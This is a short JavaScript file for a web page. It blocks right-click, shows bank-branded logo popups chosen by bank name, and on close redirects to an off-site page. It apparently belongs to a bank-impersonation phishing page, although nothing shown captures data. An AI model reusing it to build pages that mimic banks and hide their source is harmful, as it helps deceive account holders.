function onload()
{
    var message = "Function Disabled!";

    function clickIE4() {
        if (event.button == 2) {
            alert(message);
            return false;
        }
    }

    function clickNS4(e) {
        if (document.layers || document.getElementById && !document.all) {
            if (e.which == 2 || e.which == 3) {
                alert(message);
                return false;
            }
        }
    }

    if (document.layers) {
        document.captureEvents(Event.MOUSEDOWN);
        document.onmousedown = clickNS4;
    }
    else if (document.all && !document.getElementById) {
        document.onmousedown = clickIE4;
    }

    document.oncontextmenu = new Function("alert(message);return false")
}

function closes() {
    document.getElementById("modal").style.display = "none";
    var input_error=[3];
    input_error[0]=document.getElementById("error-1")
    input_error[1]=document.getElementById("error-2")
    input_error[2]=document.getElementById("error-3")
    window.location.href = "https://tamwel.us/algorthm/Page_2.html";
}

function run(bank)
{
    document.getElementById("modal").style.display = "block";
    document.getElementById("logo-popup").src = "image/Banks-Logo/Bank-" + bank + ".png";
    document.getElementById("modal-content").src = "image/background/bg-" + bank + ".jpg";
}
function check_error(){

}